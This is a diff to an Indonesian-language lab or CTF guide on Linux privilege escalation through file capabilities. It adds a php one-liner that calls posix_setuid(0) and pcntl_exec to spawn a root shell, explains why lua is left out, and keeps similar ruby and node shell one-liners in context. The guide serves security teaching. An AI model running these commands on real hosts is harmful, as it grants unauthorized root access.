@@ -44,15 +44,14 @@ www-data@jobportal:~$ getcap -r / 2>/dev/null
 /usr/bin/perl cap_setuid=ep                ← RENTAN! setuid(0) + exec shell
 /usr/bin/ruby cap_setuid=ep                ← RENTAN! Process.setuid(0) + exec
 /usr/bin/node cap_setuid=ep                ← RENTAN! process.setuid(0) + spawn
-/usr/bin/php cap_setuid=ep                 ← RENTAN! exec shell via script
-/usr/bin/lua cap_setuid=ep                 ← RENTAN! os.execute("/bin/sh")
+/usr/bin/php cap_setuid=ep                 ← RENTAN! posix_setuid(0) + pcntl_exec
 
 # --- cap_dac_read_search (baca file apa pun, tanpa shell) ---
 /usr/bin/cat cap_dac_read_search=ep        ← RENTAN! baca file apa pun
 /usr/bin/cp cap_dac_read_search=ep         ← RENTAN! salin file apa pun
 ```
 
-> **Catatan:** Fokus utama adalah interpreter dengan `cap_setuid` — langsung memberi root shell. `cap_dac_read_search` tidak memberi shell, tapi cukup untuk membaca flag langsung tanpa shell. Capability lain seperti `cap_setgid`, `cap_sys_ptrace` tetap berbahaya — daftar lengkapnya di GTFOBins → bagian **Capabilities**.
+> **Catatan:** Fokus utama adalah interpreter dengan `cap_setuid` — langsung memberi root shell. `cap_dac_read_search` tidak memberi shell, tapi cukup untuk membaca flag langsung tanpa shell. Capability lain seperti `cap_setgid`, `cap_sys_ptrace` tetap berbahaya — daftar lengkapnya di GTFOBins → bagian **Capabilities**. `lua` sengaja tidak didaftarkan karena tidak bisa memanggil `setuid(0)` — capability tidak diwarisi proses child saat exec (berbeda dengan euid pada SUID).
 
 Oneliner gabungan — cek SUID, sudo, dan capabilities **sekaligus** dalam satu command:
 
@@ -88,6 +87,9 @@ ruby -e 'Process.setuid(0); exec "/bin/sh"'
 
 # cap_setuid pada node
 node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: "inherit"})'
+
+# cap_setuid pada php
+php -r 'posix_setuid(0); pcntl_exec("/bin/sh", ["-p"]);'
 ```
 
 | Binary | Capability | Teknik |
@@ -96,6 +98,7 @@ node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: "i
 | `perl` | `cap_setuid=ep` | `setuid(0)` + `exec "/bin/sh"` |
 | `ruby` | `cap_setuid=ep` | `Process.setuid(0)` + `exec` |
 | `node` | `cap_setuid=ep` | `setuid(0)` + `spawn("/bin/sh")` |
+| `php` | `cap_setuid=ep` | `posix_setuid(0)` + `pcntl_exec("/bin/sh")` |
 
 
 ---
